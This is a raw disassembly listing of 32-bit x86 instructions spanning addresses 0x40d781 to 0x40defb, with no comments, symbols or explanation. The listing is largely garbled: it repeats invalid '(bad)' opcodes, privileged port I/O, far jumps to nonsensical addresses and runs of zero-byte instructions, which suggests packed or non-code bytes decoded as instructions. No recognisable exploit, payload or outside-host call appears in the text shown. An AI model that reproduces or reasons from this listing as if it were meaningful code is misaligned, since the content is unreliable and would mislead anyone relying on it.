  40d781:	mov    dl,0xe5
  40d783:	sub    DWORD PTR [ecx+0x1b3510b3],0xfffffff0
  40d78a:	popf   
  40d78b:	jne    0x40d729
  40d78d:	mov    dl,0xe5
  40d78f:	jle    0x40d7dc
  40d791:	xchg   esi,eax
  40d792:	mov    eax,ds:0x6300c339
  40d797:	ret    
  40d798:	sahf   
  40d799:	jbe    0x40d7d6
  40d79b:	xor    al,0x19
  40d79d:	ja     0x40d7a0
  40d79f:	call   0x444a4eb0
  40d7a4:	inc    eax
  40d7a5:	dec    edx
  40d7a6:	out    0x3,al
  40d7a8:	nop
  40d7a9:	xor    bl,ah
  40d7ab:	add    al,0x5f
  40d7ad:	sub    ecx,DWORD PTR [edi]
  40d7af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7b0:	mov    bh,0x81
  40d7b2:	pop    ebp
  40d7b3:	(bad)  
  40d7b4:	rcl    ch,1
  40d7b6:	data16 cld 
  40d7b8:	xchg   ebx,eax
  40d7b9:	mov    dl,0x83
  40d7bb:	lods   eax,DWORD PTR ds:[esi]
  40d7bc:	scas   eax,DWORD PTR es:[edi]
  40d7bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7be:	cmp    edi,DWORD PTR [ebx]
  40d7c0:	or     BYTE PTR [esi],bl
  40d7c2:	add    BYTE PTR [ebp-0x32b4d52b],ah
  40d7c8:	jnp    0x40d7f4
  40d7ca:	inc    ebx
  40d7cb:	lds    ebx,FWORD PTR [ebx+0x4b]
  40d7ce:	or     eax,0x2a711098
  40d7d3:	mov    ebp,0x0
  40d7d8:	add    bl,al
  40d7da:	dec    eax
  40d7db:	adc    bh,BYTE PTR [edi]
  40d7dd:	test   eax,0x4ac8383
  40d7e2:	jb     0x40d7fd
  40d7e4:	jmp    0x384e207c
  40d7e9:	(bad)  [ecx+0x2a]
  40d7ec:	adc    edi,ecx
  40d7ee:	jno    0x40d81a
  40d7f0:	or     eax,0x1f11487c
  40d7f5:	jns    0x40d77a
  40d7f7:	sbb    DWORD PTR [esp+edx*1-0x6c16e676],0x29
  40d7ff:	jae    0x40d7c6
  40d801:	cmp    ebp,DWORD PTR [eax]
  40d803:	arpl   bp,cx
  40d805:	das    
  40d806:	sub    BYTE PTR [ebx-0x3b],bh
  40d809:	rol    DWORD PTR [edx-0x6f080211],cl
  40d80f:	test   DWORD PTR ds:0xfdef88f8,esp
  40d815:	imul   DWORD PTR [eax-0x7f]
  40d818:	and    eax,0xddefa0e8
  40d81d:	div    DWORD PTR [eax+0x3b]
  40d820:	xor    BYTE PTR [ecx-0x5bf28523],ch
  40d826:	xchg   DWORD PTR [ebx-0x49],ebx
  40d829:	add    BYTE PTR [ecx+0x2a],ah
  40d82c:	add    BYTE PTR [ecx-0xcf19b5a],dl
  40d832:	cmp    BYTE PTR ds:0x83b0a9e3,cl
  40d838:	fsubr  DWORD PTR [edi+ecx*1]
  40d83b:	jnp    0x40d85d
  40d83d:	add    BYTE PTR [eax],al
  40d83f:	add    BYTE PTR [eax],al
  40d841:	add    BYTE PTR [edx],ah
  40d843:	lock out 0x3c,eax
  40d846:	outs   dx,DWORD PTR ds:[esi]
  40d847:	mov    cl,0xe
  40d849:	mov    esi,DWORD PTR [esi+edi*1+0x3b]
  40d84d:	(bad)  
  40d84e:	test   al,0xb0
  40d850:	or     DWORD PTR [ebp+ebx*2-0x30],0xffffffe7
  40d855:	sub    al,0xaf
  40d857:	scas   eax,DWORD PTR es:[edi]
  40d858:	push   cs
  40d859:	mov    esi,DWORD PTR ds:0x4ae82bd4
  40d85f:	jmp    0x1ce7:0xf2e2000e
  40d866:	das    
  40d867:	mov    cl,0xe
  40d869:	mov    ebp,DWORD PTR [edx]
  40d86b:	mov    ds:0x35a25d50,eax
  40d870:	int3   
  40d871:	and    bl,bh
  40d873:	jecxz  0x40d864
  40d875:	push   esp
  40d876:	ret    0x8d3b
  40d879:	in     al,0x1
  40d87b:	xor    esp,esp
  40d87d:	pushf  
  40d87e:	sub    DWORD PTR [eax-0x6690acf2],esi
  40d884:	out    dx,eax
  40d885:	jne    0x40d818
  40d887:	pop    ebp
  40d888:	(bad)  
  40d889:	(bad)  
  40d88a:	jl     0x40d866
  40d88c:	xchg   BYTE PTR [ebp+ecx*2-0x34],bl
  40d890:	lock jne 0x40d87c
  40d893:	inc    edx
  40d894:	jnp    0x40d8a2
  40d896:	test   al,0x3e
  40d898:	sbb    eax,0x854286fe
  40d89d:	lock ins BYTE PTR es:[edi],dx
  40d89f:	cmp    DWORD PTR [ebx+0x7],edi
  40d8a2:	mov    esi,esi
  40d8a4:	out    0x3d,al
  40d8a6:	add    BYTE PTR [eax],al
  40d8a8:	add    BYTE PTR [eax],al
  40d8aa:	add    al,bh
  40d8ac:	scas   eax,DWORD PTR es:[edi]
  40d8ad:	push   cs
  40d8ae:	mov    dl,BYTE PTR [eax-0x6d57c3f5]
  40d8b4:	add    eax,0x609069d5
  40d8b9:	int    0xe7
  40d8bb:	lods   eax,DWORD PTR ds:[esi]
  40d8bc:	jne    0x40d8c9
  40d8be:	add    BYTE PTR [ebx],cl
  40d8c0:	xchg   esp,eax
  40d8c1:	xchg   ebx,eax
  40d8c2:	loope  0x40d89a
  40d8c4:	leave  
  40d8c5:	or     ecx,DWORD PTR [ebx-0x3ba23e22]
  40d8cb:	xchg   ecx,eax
  40d8cc:	leave  
  40d8cd:	adc    edi,edi
  40d8cf:	outs   dx,BYTE PTR ds:[esi]
  40d8d0:	leave  
  40d8d1:	or     edi,edi
  40d8d3:	jge    0x40d922
  40d8d5:	stc    
  40d8d6:	aas    
  40d8d7:	nop
  40d8d8:	cdq    
  40d8d9:	or     al,0xe9
  40d8db:	xchg   ebp,eax
  40d8dc:	retf   0xb
  40d8df:	mov    ah,0xca
  40d8e1:	jae    0x40d926
  40d8e3:	lods   al,BYTE PTR ds:[esi]
  40d8e4:	stc    
  40d8e5:	sahf   
  40d8e6:	jae    0x40d89c
  40d8e8:	fnstenv [edx+ecx*8-0x6]
  40d8ec:	retf   0x7480
  40d8ef:	mov    WORD PTR [edi+0x9],gs
  40d8f2:	call   0x4d6e00
  40d8f7:	sbb    esi,ecx
  40d8f9:	test   esi,edi
  40d8fb:	mov    ebp,0x28cd74f9
  40d900:	sub    eax,0x5037ffa1
  40d905:	mov    al,0xe7
  40d907:	adc    BYTE PTR [esi],cl
  40d909:	or     al,BYTE PTR [eax]
  40d90b:	cmp    esi,DWORD PTR [eax]
  40d90d:	je     0x40d895
  40d90f:	add    BYTE PTR [eax],al
  40d911:	add    BYTE PTR [eax],al
  40d913:	add    BYTE PTR [edx+ecx*8-0x5c2ffff5],ah
  40d91a:	jae    0x40d8ea
  40d91c:	sbb    ebx,ecx
  40d91e:	xchg   ebx,eax
  40d91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d920:	ror    ecx,cl
  40d922:	or     ecx,DWORD PTR [ebx+0x74ca4cce]
  40d928:	cwde   
  40d929:	xor    DWORD PTR [eax],eax
  40d92b:	ficom  WORD PTR [eax-0x2a851a4e]
  40d931:	leave  
  40d932:	int3   
  40d933:	enter  0xb290,0x6c
  40d937:	mov    edi,0x4a3deef
  40d93c:	nop
  40d93d:	leave  
  40d93e:	(bad)  [esi+0x315ddac6]
  40d944:	mov    bh,0xb1
  40d946:	in     eax,0x82
  40d948:	xor    eax,0x537ce56a
  40d94d:	xchg   esi,eax
  40d94e:	cmc    
  40d94f:	adc    eax,0x80e24832
  40d954:	inc    ebx
  40d955:	xchg   esi,eax
  40d956:	stc    
  40d957:	sub    al,0xa8
  40d959:	add    edx,DWORD PTR [esi]
  40d95b:	add    eax,0xe7722d90
  40d960:	mov    ds:0x7a842ca4,eax
  40d965:	mov    dh,0x74
  40d967:	cmp    al,0x87
  40d969:	and    BYTE PTR ds:0x18ec381,ah
  40d96f:	sbb    esp,DWORD PTR es:[edi+0x72cfcc2a]
  40d976:	in     eax,0x9b
  40d978:	add    BYTE PTR [eax],al
  40d97a:	add    BYTE PTR [eax],al
  40d97c:	add    BYTE PTR [esi],bl
  40d97e:	jecxz  0x40d966
  40d980:	add    ebx,DWORD PTR ds:0xd7e8016f
  40d986:	daa    
  40d987:	sub    ch,al
  40d989:	fwait
  40d98a:	or     BYTE PTR [ebx+0x4],0x5
  40d98e:	outs   dx,DWORD PTR ds:[esi]
  40d98f:	or     DWORD PTR [eax],esp
  40d991:	mov    edx,0x9d9c358e
  40d996:	gs jecxz 0x40d99c
  40d999:	adc    ebp,edi
  40d99b:	icebp  
  40d99c:	mov    bh,dl
  40d99e:	pop    edi
  40d99f:	repz sbb edx,DWORD PTR [eax+0x7963e5b2]
  40d9a6:	fldenv [edx+0x47]
  40d9a9:	mov    ah,0x4a
  40d9ab:	push   cs
  40d9ac:	sbb    DWORD PTR [edi],eax
  40d9ae:	pop    edi
  40d9af:	add    ch,BYTE PTR [esi-0x5b]
  40d9b2:	(bad)  
  40d9b3:	lock sub cl,BYTE PTR [edx]
  40d9b6:	and    al,0x84
  40d9b8:	aas    
  40d9b9:	push   cs
  40d9ba:	pop    edi
  40d9bb:	add    bh,BYTE PTR [eax-0xe1913a6]
  40d9c1:	ret    0xefd9
  40d9c4:	inc    esi
  40d9c5:	lahf   
  40d9c6:	mov    ds,WORD PTR [esi]
  40d9c8:	cli    
  40d9c9:	jmp    0xefda:0x3668184
  40d9d0:	jmp    0xebc445e0
  40d9d5:	xchg   ebx,eax
  40d9d6:	test   DWORD PTR [ebx+0x6c],ebx
  40d9d9:	push   ds
  40d9da:	pop    ecx
  40d9db:	or     eax,0x31ca93e9
  40d9e0:	bound  eax,QWORD PTR [eax]
  40d9e2:	add    BYTE PTR [eax],al
  40d9e4:	add    BYTE PTR [eax],al
  40d9e6:	xchg   ecx,eax
  40d9e7:	mov    dl,0x83
  40d9e9:	ds mov ebx,0xfae90eb3
  40d9ef:	call   0xb41289da
  40d9f4:	push   cs
  40d9f5:	push   0x1d
  40d9f7:	mov    bl,0xff
  40d9f9:	jl     0x40da47
  40d9fb:	mov    ch,0xc
  40d9fd:	ds scas al,BYTE PTR es:[edi]
  40d9ff:	jge    0x40d984
  40da01:	int3   
  40da02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da03:	hlt    
  40da04:	sbb    ch,cl
  40da06:	sub    BYTE PTR ds:0x80340d53,0x3b
  40da0d:	test   eax,0x3def8284
  40da12:	sub    cl,al
  40da14:	xchg   dl,ch
  40da16:	mov    DWORD PTR [ebx-0x4b2ee21a],esi
  40da1c:	push   cs
  40da1d:	jb     0x40da2b
  40da1f:	cs lock sbb al,0x8d
  40da23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da24:	into   
  40da25:	adc    BYTE PTR [ecx],0xd9
  40da28:	out    dx,eax
  40da29:	add    cl,bh
  40da2b:	lahf   
  40da2c:	out    dx,eax
  40da2d:	mov    bh,0x5
  40da2f:	mov    ah,0xe
  40da31:	add    BYTE PTR [edx+0x17],dh
  40da34:	call   0xef6161e
  40da39:	mov    eax,DWORD PTR [ecx+0x31]
  40da3c:	jecxz  0x40dab3
  40da3e:	loop   0x40da99
  40da40:	shr    al,0x37
  40da43:	jne    0x40da52
  40da45:	add    BYTE PTR [ebx+0x63e4ee],ch
  40da4b:	add    BYTE PTR [eax],al
  40da4d:	add    BYTE PTR [eax],al
  40da4f:	daa    
  40da50:	pop    edx
  40da51:	jnp    0x40da77
  40da53:	mov    DWORD PTR [ecx],esi
  40da55:	cli    
  40da56:	je     0x40da11
  40da58:	xor    DWORD PTR [ecx+0xeb4b858],esi
  40da5e:	add    BYTE PTR ds:0x5ff59ce,al
  40da64:	ror    DWORD PTR [edi],1
  40da66:	lea    ebp,[esi]
  40da68:	outs   dx,BYTE PTR ds:[esi]
  40da69:	or     eax,0xd13c7900
  40da6e:	mov    ?,WORD PTR [eax-0x4c]
  40da71:	mov    eax,eax
  40da73:	add    al,0xe3
  40da75:	test   bh,cl
  40da77:	xchg   ecx,eax
  40da78:	out    dx,eax
  40da79:	dec    esi
  40da7a:	add    DWORD PTR [ecx-0x46],edi
  40da7d:	push   es
  40da7e:	jmp    DWORD PTR [eax+ecx*2+0x1d]
  40da82:	inc    eax
  40da83:	imul   eax,DWORD PTR [esi+ecx*1-0x484c6f15],0xeb43850
  40da8e:	mov    esi,DWORD PTR [esi+0x29000da3]
  40da94:	jmp    0x40dae0
  40da96:	sbb    al,0x7b
  40da98:	mov    cl,0xc8
  40da9a:	add    edi,DWORD PTR [eax]
  40da9c:	pop    ebx
  40da9d:	mov    eax,0xeb43858
  40daa2:	mov    ebp,esi
  40daa4:	cmp    ebx,DWORD PTR [eax+0xbca9041]
  40daaa:	or     DWORD PTR [esi],0xffffffcc
  40daad:	repnz xchg ebx,eax
  40daaf:	rol    ch,1
  40dab1:	or     eax,0x5e
  40dab6:	add    BYTE PTR [eax],al
  40dab8:	pop    ebp
  40dab9:	mov    eax,0xc99cc225
  40dabe:	jbe    0x40db03
  40dac0:	mov    ah,0xfd
  40dac2:	ds push ebp
  40dac4:	ds sbb bh,bl
  40dac7:	fiadd  DWORD PTR [ebx+0x1c]
  40daca:	xor    DWORD PTR [ebx-0x54],0xffffffa9
  40dace:	jb     0x40dae7
  40dad0:	cmp    cl,dl
  40dad2:	xchg   ebx,eax
  40dad3:	lds    edx,FWORD PTR [edx-0x35]
  40dad6:	or     ecx,DWORD PTR [ebx+0x74824eb8]
  40dadc:	(bad)  
  40dadd:	fcmovne st,st(3)
  40dadf:	call   0x4ca548
  40dae4:	adc    eax,0x9fffbb79
  40dae9:	leave  
  40daea:	jbe    0x40daba
  40daec:	xchg   edi,eax
  40daed:	ja     0x40db56
  40daef:	dec    DWORD PTR [edi+0x523193c9]
  40daf5:	retf   0x8b0b
  40daf8:	push   0x8974904e
  40dafd:	push   esp
  40dafe:	mov    dl,0xe7
  40db00:	ror    DWORD PTR [edx],cl
  40db02:	or     eax,0xc2187b00
  40db07:	popf   
  40db08:	or     cl,cl
  40db0a:	or     eax,DWORD PTR [eax]
  40db0c:	(bad)  
  40db0e:	jbe    0x40db55
  40db10:	rcl    BYTE PTR [edx+0x4e],0x24
  40db14:	test   al,0x4
  40db16:	or     eax,0x2662538b
  40db1b:	and    al,0x0
  40db1d:	add    BYTE PTR [eax],al
  40db1f:	add    BYTE PTR [eax],al
  40db21:	cwde   
  40db22:	mov    ecx,0x6538cc6f
  40db27:	test   al,0xff
  40db29:	daa    
  40db2a:	mov    dl,0x61
  40db2c:	les    esp,FWORD PTR [edi+ecx*4-0x4df0b59c]
  40db33:	in     eax,0x3
  40db35:	xchg   edx,eax
  40db36:	pop    ebp
  40db37:	lods   al,BYTE PTR ds:[esi]
  40db38:	jg     0x40db9d
  40db3a:	mov    gs,ebp
  40db3c:	jle    0x40db91
  40db3e:	mov    ss,ecx
  40db40:	jle    0x40dacb
  40db42:	sub    esi,ebp
  40db44:	jle    0x40db99
  40db46:	mov    es,ebp
  40db48:	jle    0x40dba3
  40db4a:	scas   al,BYTE PTR es:[edi]
  40db4b:	jle    0x40db49
  40db4d:	or     ch,BYTE PTR [esi+0x9]
  40db50:	loopne 0x40db1f
  40db52:	mov    cl,0xe6
  40db54:	sahf   
  40db55:	cld    
  40db56:	xor    al,BYTE PTR [eax-0x1a293884]
  40db5c:	add    eax,0x307cb845
  40db61:	ins    BYTE PTR es:[edi],dx
  40db62:	mov    edx,0xb674406c
  40db67:	ins    BYTE PTR es:[edi],dx
  40db68:	(bad)  
  40db69:	sbb    BYTE PTR [edx-0x6d8bbf84],ch
  40db6f:	jl     0x40dbaf
  40db71:	mov    WORD PTR [ecx],gs
  40db73:	out    dx,al
  40db74:	jle    0x40db49
  40db76:	mov    cs,ecx
  40db78:	rol    DWORD PTR [edi+0xcff1cb3],0x65
  40db7f:	jne    0x40dbfd
  40db81:	aad    0x4e
  40db83:	or     eax,0x6b
  40db88:	add    BYTE PTR [eax],al
  40db8a:	sbb    eax,0x547ee5b4
  40db8f:	retf   
  40db90:	xchg   edi,eax
  40db91:	mov    al,ds:0xc36ad65f
  40db96:	jecxz  0x40dbdc
  40db98:	xor    al,0x34
  40db9a:	sbb    eax,DWORD PTR [eax]
  40db9c:	ins    DWORD PTR es:[edi],dx
  40db9d:	mov    ecx,0x52b462f
  40dba2:	nop
  40dba3:	sub    ebp,DWORD PTR [edx]
  40dba5:	loopne 0x40db3e
  40dba7:	das    
  40dba8:	pop    gs
  40dbaa:	and    BYTE PTR [ebp-0x2a388811],0xef
  40dbb1:	jmp    0x4d27c054
  40dbb6:	dec    esp
  40dbb7:	mov    bl,0xe
  40dbb9:	xor    BYTE PTR [ebx-0x7b1ab0d7],0x71
  40dbc0:	sub    ah,ch
  40dbc2:	sbb    esp,eax
  40dbc4:	jae    0x40dbae
  40dbc6:	xchg   ebx,eax
  40dbc7:	sub    cl,BYTE PTR [ebx-0x33]
  40dbca:	iret   
  40dbcb:	xor    edi,ecx
  40dbcd:	cmc    
  40dbce:	nop
  40dbcf:	retf   0xe52b
  40dbd2:	xchg   esp,eax
  40dbd3:	mov    dl,0x5d
  40dbd5:	mov    eax,0xd2a8158
  40dbda:	sub    al,0xb1
  40dbdc:	pop    ss
  40dbdd:	jmp    0x40db72
  40dbdf:	call   0x5109:0x61b00d52
  40dbe6:	adc    bl,BYTE PTR [ecx+0xd]
  40dbe9:	jmp    0x96b4d1c
  40dbee:	add    BYTE PTR [eax],al
  40dbf0:	add    BYTE PTR [eax],al
  40dbf2:	add    ch,dl
  40dbf4:	jge    0x40dbfc
  40dbf6:	pushf  
  40dbf7:	cwde   
  40dbf8:	add    BYTE PTR [ebx+0xe85fb31],0xe9
  40dbff:	xchg   ebx,eax
  40dc00:	sub    edx,DWORD PTR [edx-0x4b]
  40dc03:	es mov edx,0x21afac85
  40dc09:	or     al,0x12
  40dc0b:	addr16 call 0x37ef:0xa782a151
  40dc13:	(bad)  
  40dc14:	aad    0xef
  40dc16:	jmp    0x2d27c0f7
  40dc1b:	push   ebx
  40dc1c:	mov    dl,0xe
  40dc1e:	call   0x9563:0xc1c02996
  40dc25:	or     eax,0xcc572900
  40dc2a:	pop    edi
  40dc2b:	xchg   edi,eax
  40dc2c:	lea    edx,[ebx-0x3e]
  40dc2f:	dec    ebp
  40dc30:	mov    cl,0x59
  40dc32:	mov    esp,ebp
  40dc34:	mov    al,ds:0x9a2535d
  40dc39:	pop    edx
  40dc3a:	xor    DWORD PTR [edx-0x4e],0xe
  40dc3e:	push   edi
  40dc3f:	lods   eax,DWORD PTR ds:[esi]
  40dc40:	f2xm1  
  40dc42:	jae    0x40dc31
  40dc44:	sub    DWORD PTR [ebx],ebx
  40dc46:	pusha  
  40dc47:	(bad)  [eax+0xe]
  40dc4a:	mov    eax,edx
  40dc4c:	(bad)  
  40dc4e:	push   0x8b0eb13b
  40dc53:	loop   0x40dc2d
  40dc55:	in     al,0x7
  40dc57:	add    BYTE PTR [eax],al
  40dc59:	add    BYTE PTR [eax],al
  40dc5b:	add    BYTE PTR [edx-0x53],ah
  40dc5e:	test   BYTE PTR [ebp-0x72d63dca],0xfc
  40dc65:	sub    al,0x40
  40dc67:	(bad)  
  40dc68:	in     al,dx
  40dc69:	sub    BYTE PTR [eax+0x6a],al
  40dc6c:	fsub   QWORD PTR [ecx-0x4d8aba39]
  40dc72:	push   cs
  40dc73:	add    BYTE PTR [ecx-0x4363e4d7],bh
  40dc79:	jo     0x40dc89
  40dc7b:	push   edi
  40dc7c:	and    bh,BYTE PTR [esi]
  40dc7e:	icebp  
  40dc7f:	adc    eax,0x2fc549
  40dc84:	cld    
  40dc85:	inc    eax
  40dc86:	jnp    0x40dc5c
  40dc88:	repnz xchg ebp,eax
  40dc8a:	es call 0x4fcaf6
  40dc90:	add    dl,BYTE PTR [esi-0x11a117ea]
  40dc96:	push   cs
  40dc97:	add    dl,dh
  40dc99:	adc    eax,0xb12b20e8
  40dc9e:	push   cs
  40dc9f:	pop    edi
  40dca0:	xchg   edi,eax
  40dca1:	push   ebp
  40dca2:	int3   
  40dca3:	pop    ebx
  40dca4:	nop
  40dca5:	adc    cl,dl
  40dca7:	add    edx,DWORD PTR [eax-0x1cf468b8]
  40dcad:	mov    dh,0x3c
  40dcaf:	mov    edi,DWORD PTR [ebp+ebp*4-0x5a5bc73e]
  40dcb6:	(bad)  
  40dcb7:	push   esi
  40dcb8:	sbb    esi,ebx
  40dcba:	not    BYTE PTR [ebx+0xf097a51]
  40dcc0:	add    BYTE PTR [eax],al
  40dcc2:	add    BYTE PTR [eax],al
  40dcc4:	add    dh,bl
  40dcc6:	or     DWORD PTR [edx],edx
  40dcc8:	add    edx,DWORD PTR [ebx+edx*1]
  40dccb:	and    cl,BYTE PTR [edi]
  40dccd:	dec    ebp
  40dcce:	pop    es
  40dccf:	div    DWORD PTR [ebp-0x785ce730]
  40dcd5:	inc    esp
  40dcd6:	in     eax,dx
  40dcd7:	cli    
  40dcd8:	mov    ebx,edi
  40dcda:	push   ecx
  40dcdb:	daa    
  40dcdc:	and    al,0x82
  40dcde:	push   edx
  40dcdf:	das    
  40dce0:	and    al,0x78
  40dce2:	inc    esi
  40dce3:	retf   
  40dce4:	push   cs
  40dce5:	push   es
  40dce6:	(bad)  
  40dce7:	or     al,0x0
  40dce9:	nop
  40dcea:	push   eax
  40dceb:	pop    es
  40dcec:	and    al,0x78
  40dcee:	dec    edi
  40dcef:	aaa    
  40dcf0:	and    al,0x7c
  40dcf2:	pusha  
  40dcf3:	mov    edx,0xfead5c88
  40dcf8:	mov    dl,dl
  40dcfa:	mov    al,0xc9
  40dcfc:	jae    0x40dd44
  40dcfe:	adc    DWORD PTR [eax],eax
  40dd00:	inc    esi
  40dd01:	dec    eax
  40dd02:	ss sbb eax,0xd3ed4c8d
  40dd08:	dec    edi
  40dd09:	sbb    eax,0xe03fd005
  40dd0e:	jbe    0x40dd3f
  40dd10:	and    al,0xd0
  40dd12:	cmp    DWORD PTR [edi],edi
  40dd14:	push   ecx
  40dd15:	or     eax,DWORD PTR [esi-0x2392416d]
  40dd1b:	xchg   DWORD PTR [edx-0x76381224],ecx
  40dd21:	dec    eax
  40dd22:	mov    dl,0x2d
  40dd24:	sub    BYTE PTR [edx+ecx*4+0x4159],ch
  40dd2b:	add    BYTE PTR [eax],al
  40dd2d:	add    BYTE PTR [ebx],bl
  40dd2f:	jle    0x40dd32
  40dd31:	fcomp  DWORD PTR [ecx]
  40dd33:	inc    esi
  40dd34:	or     edx,esi
  40dd36:	or     BYTE PTR [esi+0x1],bl
  40dd39:	inc    esp
  40dd3a:	or     eax,0x1acd3a00
  40dd3f:	outs   dx,BYTE PTR ds:[esi]
  40dd40:	add    esp,ecx
  40dd42:	sbb    BYTE PTR [eax-0x27],dh
  40dd45:	jl     0x40dce8
  40dd47:	mov    edx,0xc774127e
  40dd4c:	fstp   TBYTE PTR [eax+0x53]
  40dd4f:	mov    cs,ebp
  40dd51:	xor    ebx,DWORD PTR [esi-0x2d]
  40dd54:	sbb    eax,esp
  40dd56:	mov    edi,0xc47b167b
  40dd5b:	leave  
  40dd5c:	call   0xe6f7:0x8cd2ee88
  40dd63:	pop    ebp
  40dd64:	leave  
  40dd65:	inc    ebx
  40dd66:	inc    ebx
  40dd67:	jg     0x40dd19
  40dd69:	xor    al,0xb
  40dd6b:	in     eax,0x5d
  40dd6d:	cmp    cl,bl
  40dd6f:	rcr    BYTE PTR [eax+0x7a],cl
  40dd72:	iret   
  40dd73:	daa    
  40dd74:	mov    dl,0xdf
  40dd76:	mov    eax,ds:0xa3df9227
  40dd7b:	cs aas 
  40dd7d:	adc    BYTE PTR [ecx],dh
  40dd7f:	daa    
  40dd80:	mov    ds:0xfc6a7fdf,al
  40dd85:	mov    bl,0x24
  40dd87:	lods   eax,DWORD PTR ds:[esi]
  40dd88:	lea    edx,gs:[ecx-0x777c4ba2]
  40dd8f:	mov    ah,0x91
  40dd91:	or     DWORD PTR [eax],eax
  40dd93:	add    BYTE PTR [eax],al
  40dd95:	add    BYTE PTR [eax],al
  40dd97:	retf   
  40dd98:	loop   0x40dd34
  40dd9a:	add    BYTE PTR [eax],dl
  40dd9c:	int3   
  40dd9d:	in     al,0xf
  40dd9f:	cdq    
  40dda0:	shr    BYTE PTR [edx],1
  40dda2:	mul    DWORD PTR ds:0x88610ee8
  40dda8:	xchg   esi,eax
  40dda9:	sbb    al,0x60
  40ddab:	mov    al,ds:0xa0221a96
  40ddb0:	xchg   esi,eax
  40ddb1:	push   ss
  40ddb2:	out    dx,al
  40ddb3:	(bad)  
  40ddb4:	jge    0x40dda5
  40ddb6:	(bad)  
  40ddb7:	push   cs
  40ddb8:	fst    QWORD PTR [esi+0x11]
  40ddbb:	push   0x2d3c1b96
  40ddc0:	gs pop ebx
  40ddc2:	push   ss
  40ddc3:	mov    dh,BYTE PTR [ebx-0x33f45b7d]
  40ddc9:	das    
  40ddca:	jmp    0x40dd5f
  40ddcc:	cmp    eax,0x45d46cc7
  40ddd1:	push   DWORD PTR [ecx-0x31]
  40ddd4:	xchg   esi,eax
  40ddd5:	dec    edx
  40ddd6:	pusha  
  40ddd7:	or     al,0x4a
  40ddd9:	or     eax,0x7fda93e9
  40ddde:	(bad)  
  40dddf:	mov    WORD PTR [edx-0x22ad5dc5],?
  40dde5:	and    ah,BYTE PTR [edx-0x59]
  40dde8:	xchg   esi,eax
  40dde9:	sub    dh,BYTE PTR [edx-0x78579b0]
  40ddef:	retf   0x3676
  40ddf2:	aad    0xc7
  40ddf4:	sar    BYTE PTR [edx+0xd],1
  40ddf7:	push   eax
  40ddf8:	gs pop ebx
  40ddfa:	dec    esi
  40ddfb:	add    BYTE PTR [eax],al
  40ddfd:	add    BYTE PTR [eax],al
  40ddff:	add    BYTE PTR [edi-0x47adc96a],cl
  40de05:	addr16 out dx,eax
  40de07:	mov    ch,0xcf
  40de09:	(bad)  
  40de0a:	out    dx,eax
  40de0b:	mov    ebp,0xb5ef8dc7
  40de10:	mov    edi,0xe326578d
  40de15:	cmp    al,0xd7
  40de17:	mov    esi,0x2a836fb5
  40de1c:	mov    edx,0x51ddcb35
  40de21:	cdq    
  40de22:	push   cs
  40de23:	add    BYTE PTR [eax],bl
  40de25:	mov    al,ds:0xaee93d83
  40de2a:	dec    edx
  40de2b:	add    BYTE PTR [ecx+0x69017594],dl
  40de31:	push   ecx
  40de32:	scas   eax,DWORD PTR es:[edi]
  40de33:	jne    0x40ddc8
  40de35:	aaa    
  40de36:	jl     0x40de5c
  40de38:	cdq    
  40de39:	aaa    
  40de3a:	jl     0x40de60
  40de3c:	cdq    
  40de3d:	aaa    
  40de3e:	jl     0x40de64
  40de40:	mov    DWORD PTR [edi],esi
  40de42:	jl     0x40de68
  40de44:	mov    DWORD PTR [edi],esi
  40de46:	jl     0x40de6c
  40de48:	cdq    
  40de49:	aaa    
  40de4a:	pop    esp
  40de4b:	and    al,0x99
  40de4d:	sub    ebp,DWORD PTR [ebx+0x53]
  40de50:	mov    dl,0x9a
  40de52:	sub    bl,BYTE PTR [esp+edx*2]
  40de55:	dec    ebx
  40de56:	arpl   WORD PTR [eax*1-0x2a8b7c61],sp
  40de5d:	aam    0x8a
  40de5f:	(bad)  [ebp+0xf68aef]
  40de65:	add    BYTE PTR [eax],al
  40de67:	add    BYTE PTR [eax],al
  40de69:	cmc    
  40de6a:	shl    DWORD PTR [edi+ebp*2],1
  40de6d:	and    eax,0xb68b09c0
  40de72:	stos   BYTE PTR es:[edi],al
  40de73:	jecxz  0x40de78
  40de75:	jb     0x40de06
  40de77:	jle    0x40dee1
  40de79:	jmp    0xae0ed32
  40de7e:	lahf   
  40de7f:	out    dx,eax
  40de80:	je     0x40de17
  40de82:	out    dx,al
  40de83:	lock shr BYTE PTR [edx],1
  40de86:	pcmpeqw mm4,QWORD PTR ds:[ebp+0x7233f9e1]
  40de8e:	lods   al,BYTE PTR ds:[esi]
  40de8f:	push   cs
  40de90:	jmp    ebp
  40de92:	lock pop ds
  40de94:	jmp    ebp
  40de96:	lock cmp edi,edi
  40de99:	cmc    
  40de9a:	lock cmp edx,DWORD PTR [ebx+0x47]
  40de9e:	stos   BYTE PTR es:[edi],al
  40de9f:	push   cs
  40dea0:	call   DWORD PTR [eax-0x1ac82fd3]
  40dea6:	or     dh,BYTE PTR [edi-0x32]
  40dea9:	push   0x6ffe89d2
  40deae:	inc    ebp
  40deaf:	call   0xb00:0xc42fbe7
  40deb6:	cwde   
  40deb7:	sub    BYTE PTR [ebp-0x45],bl
  40deba:	js     0x40dedf
  40debc:	ret    0xd9a8
  40debf:	and    BYTE PTR [ebx-0x870a2cc],cl
  40dec5:	adc    ecx,DWORD PTR [esi]
  40dec7:	fcom   DWORD PTR [edx-0x22]
  40deca:	inc    esp
  40decb:	add    BYTE PTR [eax],dl
  40decd:	add    BYTE PTR [eax],al
  40decf:	add    BYTE PTR [eax],al
  40ded1:	add    bh,al
  40ded3:	inc    esp
  40ded4:	enter  0xb96f,0x9d
  40ded8:	or     al,BYTE PTR [ebp-0x7d0f79da]
  40dede:	xchg   esi,eax
  40dedf:	fisttp QWORD PTR [ebx]
  40dee1:	jne    0x40de7c
  40dee3:	and    DWORD PTR [ebx+0x77],eax
  40dee6:	xchg   ecx,eax
  40dee7:	fldcw  WORD PTR [edi-0x41]
  40deea:	test   esi,eax
  40deec:	mov    dh,BYTE PTR [esp+edx*4+0x38]
  40def0:	add    DWORD PTR [eax],ebx
  40def2:	out    dx,eax
  40def3:	(bad)  
  40def4:	fist   WORD PTR [ebp-0x19]
  40def7:	into   
  40def8:	idiv   esi
  40defa:	inc    ebp
  40defb:	rcl    DWORD PTR [ecx+ebx*4-0x74f42670],1
